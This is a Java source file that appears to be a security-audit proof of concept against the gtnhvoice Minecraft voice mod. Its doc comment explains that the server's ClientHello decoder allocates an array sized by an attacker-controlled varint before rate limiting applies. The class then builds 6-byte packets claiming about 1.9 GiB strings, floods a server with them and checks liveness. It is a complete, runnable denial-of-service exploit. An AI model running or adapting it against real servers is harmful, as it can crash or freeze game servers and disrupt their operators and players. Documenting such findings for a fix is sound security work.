package com.enn3developer.gtnhvoice.security;

import java.io.ByteArrayOutputStream;

/**
 * Finding: unbounded, un-rate-limited memory allocation in the reliable {@code gtnhvoice} control
 * channel decode.
 *
 * <p>{@code ClientHelloPacket.fromBytes} -&gt; {@code HelloCodec.decodeClientHello} reads the
 * {@code modVersion} string via {@code HelloCodec.readUtf8String}, which does
 * {@code new byte[readVarInt(in)]} <b>before</b> reading any bytes. The LEB128 varint is fully
 * attacker-controlled and only bounded at "&gt; 35 bits" - so a 5-byte varint claiming up to
 * {@code Integer.MAX_VALUE} (~2 GiB) forces a ~2 GiB array allocation on the Netty IO thread.
 *
 * <p>Crucially this runs inside {@code fromBytes} (the FML {@code FMLIndexedMessageToMessageCodec}
 * decode step) which executes <b>before</b> {@code VoiceServerManager.handleClientHello} and thus
 * before the per-player {@code HelloRateLimiter}. The hello rate limiter (the fix for finding #9)
 * therefore does not gate this at all: every crafted 6-byte payload triggers a full giant
 * allocation, regardless of how fast they arrive.
 *
 * <p>The body we send is {@code [protocolVersion=4][varint length][ (no string bytes) ]}. The
 * decoder allocates {@code new byte[length]}, then {@code readFully} throws EOF - but the giant
 * array was already allocated. A burst of these produces sustained multi-GiB allocation churn:
 * OutOfMemoryError and/or GC-thrash freezing of the server tick loop.
 *
 * <p>Client-side we only see send throughput; watch the server heap with
 * {@code jcmd <pid> GC.heap_info} and the server log for OOM / tick-lag.
 */
public final class HelloAllocDos {

    // SimpleNetworkWrapper discriminator for ClientHello (serverbound, index 0 in NetworkHandler.init()).
    private static final int DISC_CLIENT_HELLO = 0;

    public static void main(String[] args) throws Exception {
        String host = args.length > 0 ? args[0] : "127.0.0.1";
        int port = args.length > 1 ? Integer.parseInt(args[1]) : 25565;
        String username = args.length > 2 ? args[2] : "mallory";
        // Claimed modVersion length. Default ~1.9 GiB, just under the JVM max-array limit so the VM
        // actually COMMITS the allocation (a real heap spike on the main server thread) instead of
        // throwing "Requested array size exceeds VM limit" cheaply as Integer.MAX_VALUE would.
        int claimedLen = args.length > 3 ? Integer.parseInt(args[3]) : 1_900_000_000;
        int count = args.length > 4 ? Integer.parseInt(args[4]) : 40;

        byte[] body = craftHelloBody(claimedLen);
        System.out.println("[alloc-dos] crafted ClientHello body = " + body.length
            + " bytes, claims modVersion length = " + claimedLen + " (" + (claimedLen / (1024L * 1024L))
            + " MiB) per packet");

        try (VoiceSession s = EvilClient.connect(host, port)
            .username(username)
            .establish()) {

            System.out.println("[alloc-dos] session up (sessionId=" + s.getSessionId()
                + "); firing " + count + " malformed ClientHellos on the gtnhvoice control channel");

            long start = System.nanoTime();
            for (int i = 0; i < count; i++) {
                s.sendControl(DISC_CLIENT_HELLO, body);
                if ((i + 1) % 20 == 0) {
                    System.out.println("[alloc-dos] sent " + (i + 1) + " / " + count);
                    // A tiny pace so the outbound TCP buffer flushes and the server actually decodes each
                    // one; the point is per-packet allocation, not raw send rate.
                    Thread.sleep(50);
                }
            }
            double secs = (System.nanoTime() - start) / 1e9;
            System.out.printf("[alloc-dos] DONE: %d malformed hellos in %.1fs%n", count, secs);

            // Prove liveness impact: try a normal round-trip after the flood.
            System.out.println("[alloc-dos] post-flood: sending a valid ping, waiting for the server to still respond");
            s.ping();
            Thread.sleep(2000);
        }
    }

    /**
     * Builds a ClientHello body the tolerant decoder accepts up to the giant allocation:
     * {@code protocolVersion} byte, then an LEB128 varint claiming {@code claimedLen} string bytes,
     * then no actual string bytes. {@code decodeClientHello} allocates {@code new byte[claimedLen]}
     * before its {@code readFully} fails.
     */
    static byte[] craftHelloBody(int claimedLen) {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        bos.write(EvilClient.PROTOCOL_VERSION); // protocolVersion, read first
        writeVarInt(bos, claimedLen); // modVersion length prefix - the weapon
        // no string bytes follow
        return bos.toByteArray();
    }

    private static void writeVarInt(ByteArrayOutputStream out, int value) {
        while ((value & ~0x7F) != 0) {
            out.write((value & 0x7F) | 0x80);
            value >>>= 7;
        }
        out.write(value);
    }

    private HelloAllocDos() {}
}
